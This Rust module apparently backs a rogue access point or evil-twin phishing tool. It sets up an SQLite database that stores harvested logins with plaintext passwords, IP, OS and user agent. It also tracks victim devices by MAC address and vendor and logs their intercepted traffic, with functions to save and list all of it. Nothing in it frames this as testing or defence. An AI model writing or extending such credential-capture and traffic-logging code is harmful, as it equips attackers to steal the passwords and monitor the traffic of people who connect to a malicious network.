use sqlite::{Connection, State};
use std::sync::{Mutex, OnceLock};
use tracing::{info, error};

static DB_CONN: OnceLock<Mutex<Connection>> = OnceLock::new();

pub fn get_db() -> &'static Mutex<Connection> {
    DB_CONN.get_or_init(|| {
        let connection = sqlite::open("../system/runtime/ap1.db").expect("Failed to open database");

        // Initialize tables
        connection.execute("
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY,
                login TEXT,
                password TEXT,
                ip TEXT,
                os TEXT,
                ua TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY,
                mac TEXT UNIQUE,
                vendor TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS traffic (
                id INTEGER PRIMARY KEY,
                source TEXT,
                destination TEXT,
                protocol TEXT,
                info TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            );
        ").expect("Failed to initialize tables");

        Mutex::new(connection)
    })
}

pub fn save_credential(login: &str, password: &str, ip: &str, os: &str, ua: &str) {
    let db = get_db().lock().unwrap();
    let query = "INSERT INTO credentials (login, password, ip, os, ua) VALUES (?, ?, ?, ?, ?)";
    let mut statement = db.prepare(query).unwrap();
    statement.bind((1, login)).unwrap();
    statement.bind((2, password)).unwrap();
    statement.bind((3, ip)).unwrap();
    statement.bind((4, os)).unwrap();
    statement.bind((5, ua)).unwrap();

    if let Err(e) = statement.next() {
        error!("Failed to save credential to DB: {}", e);
    } else {
        info!("[DB] Credential saved for user: {}", login);
    }
}

pub fn get_credentials() -> Vec<serde_json::Value> {
    let db = get_db().lock().unwrap();
    let query = "SELECT login, password, ip, os, ua, timestamp FROM credentials ORDER BY timestamp DESC";
    let mut statement = db.prepare(query).unwrap();

    let mut results = Vec::new();
    while let Ok(State::Row) = statement.next() {
        let mut obj = serde_json::Map::new();
        obj.insert("login".to_string(), serde_json::Value::String(statement.read::<String, _>("login").unwrap()));
        obj.insert("password".to_string(), serde_json::Value::String(statement.read::<String, _>("password").unwrap()));
        obj.insert("ip".to_string(), serde_json::Value::String(statement.read::<String, _>("ip").unwrap()));
        obj.insert("os".to_string(), serde_json::Value::String(statement.read::<String, _>("os").unwrap()));
        obj.insert("ua".to_string(), serde_json::Value::String(statement.read::<String, _>("ua").unwrap()));
        obj.insert("timestamp".to_string(), serde_json::Value::String(statement.read::<String, _>("timestamp").unwrap()));
        results.push(serde_json::Value::Object(obj));
    }
    results
}

pub fn log_traffic(source: &str, destination: &str, protocol: &str, info: &str) {
    let db = match get_db().lock() {
        Ok(guard) => guard,
        Err(_) => return,
    };
    let query = "INSERT INTO traffic (source, destination, protocol, info) VALUES (?, ?, ?, ?)";
    let mut statement = db.prepare(query).unwrap();
    statement.bind((1, source)).unwrap();
    statement.bind((2, destination)).unwrap();
    statement.bind((3, protocol)).unwrap();
    statement.bind((4, info)).unwrap();

    let _ = statement.next();
}

pub fn get_traffic(limit: i32) -> Vec<serde_json::Value> {
    let db = get_db().lock().unwrap();
    let query = format!("SELECT source, destination, protocol, info, timestamp FROM traffic ORDER BY timestamp DESC LIMIT {}", limit);
    let mut statement = db.prepare(query).unwrap();

    let mut results = Vec::new();
    while let Ok(State::Row) = statement.next() {
        let mut obj = serde_json::Map::new();
        obj.insert("source".to_string(), serde_json::Value::String(statement.read::<String, _>("source").unwrap()));
        obj.insert("destination".to_string(), serde_json::Value::String(statement.read::<String, _>("destination").unwrap()));
        obj.insert("protocol".to_string(), serde_json::Value::String(statement.read::<String, _>("protocol").unwrap()));
        obj.insert("info".to_string(), serde_json::Value::String(statement.read::<String, _>("info").unwrap()));
        obj.insert("timestamp".to_string(), serde_json::Value::String(statement.read::<String, _>("timestamp").unwrap()));
        results.push(serde_json::Value::Object(obj));
    }
    results
}

pub fn update_client(mac: &str, vendor: &str) {
    let db = get_db().lock().unwrap();
    let query = "INSERT INTO clients (mac, vendor) VALUES (?, ?)
                 ON CONFLICT(mac) DO UPDATE SET last_seen = CURRENT_TIMESTAMP";
    let mut statement = db.prepare(query).unwrap();
    statement.bind((1, mac)).unwrap();
    statement.bind((2, vendor)).unwrap();
    let _ = statement.next();
}
